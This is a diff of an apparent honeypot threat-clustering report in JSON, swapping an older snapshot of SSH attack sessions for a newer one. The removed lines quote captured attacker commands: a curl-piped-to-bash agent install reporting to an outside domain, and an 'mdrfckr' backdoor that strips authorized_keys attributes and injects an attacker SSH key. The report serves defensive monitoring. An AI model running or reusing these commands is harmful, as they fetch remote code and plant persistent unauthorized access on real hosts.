@@ -1,26 +1,11 @@
 {
-  "generated_at": "2026-06-14T23:12:21.907222+00:00",
-  "total_sessions_with_commands": 5,
-  "total_clusters": 3,
-  "campaign_clusters": 1,
-  "singleton_clusters": 1,
-  "highest_severity": "HIGH",
-  "active_campaigns": [
-    {
-      "cluster_id": "CLU-003",
-      "name": "mdrfckr SSH Key Injection",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1021.004",
-        "T1078",
-        "T1070",
-        "T1140",
-        "T1105"
-      ]
-    }
-  ],
+  "generated_at": "2026-06-15T04:50:37.910961+00:00",
+  "total_sessions_with_commands": 2,
+  "total_clusters": 1,
+  "campaign_clusters": 0,
+  "singleton_clusters": 0,
+  "highest_severity": "NONE",
+  "active_campaigns": [],
   "clusters": [
     {
       "cluster_id": "CLU-001",
@@ -31,55 +16,8 @@
       "matched_campaigns": [],
       "session_count": 2,
       "unique_ips": [
-        "137.131.9.65"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
-      "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
-      ],
-      "members": [
-        {
-          "session_id": "IR-13d3313712e1",
-          "src_ip": "137.131.9.65",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T21:34:49.448257Z"
-        },
-        {
-          "session_id": "IR-43fda8de5949",
-          "src_ip": "137.131.9.65",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-14T21:37:21.748226Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
         "10.0.0.73",
-        "111.29.52.71"
+        "61.169.193.210"
       ],
       "unique_ip_count": 2,
       "sequence_hash": "6fa4c8ac58e7a1d9",
@@ -94,82 +32,20 @@
       ],
       "members": [
         {
-          "session_id": "IR-7df2db0e0eac",
-          "src_ip": "10.0.0.73",
-          "country": "",
-          "isp": "",
-          "command_count": 1,
-          "timestamp": "2026-06-14T21:29:09.097451Z"
-        },
-        {
-          "session_id": "IR-e5e108cf4597",
-          "src_ip": "111.29.52.71",
+          "session_id": "IR-aa6c7ddb7f52",
+          "src_ip": "61.169.193.210",
           "country": "CN",
-          "isp": "China Mobile Communications Corporation",
+          "isp": "CHINANET Shanghai province network",
           "command_count": 1,
-          "timestamp": "2026-06-14T22:28:40.425954Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": true,
-      "campaign_name": "mdrfckr SSH Key Injection",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-      "matched_campaigns": [
-        {
-          "name": "mdrfckr SSH Key Injection",
-          "ttps": [
-            "T1021.004",
-            "T1078",
-            "T1105"
-          ],
-          "severity": "HIGH",
-          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 1,
-      "unique_ips": [
-        "10.0.0.73"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "560104d0f634867a",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
+          "timestamp": "2026-06-15T00:26:46.397660Z"
         },
         {
-          "id": "T1078",
-          "name": "Valid Accounts"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        }
-      ],
-      "representative_commands": [
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h"
-      ],
-      "members": [
-        {
-          "session_id": "IR-329c5655b6b9",
+          "session_id": "IR-7644a9c66016",
           "src_ip": "10.0.0.73",
           "country": "",
           "isp": "",
           "command_count": 1,
-          "timestamp": "2026-06-14T21:41:39.244565Z"
+          "timestamp": "2026-06-15T00:43:31.154818Z"
         }
       ]
     }
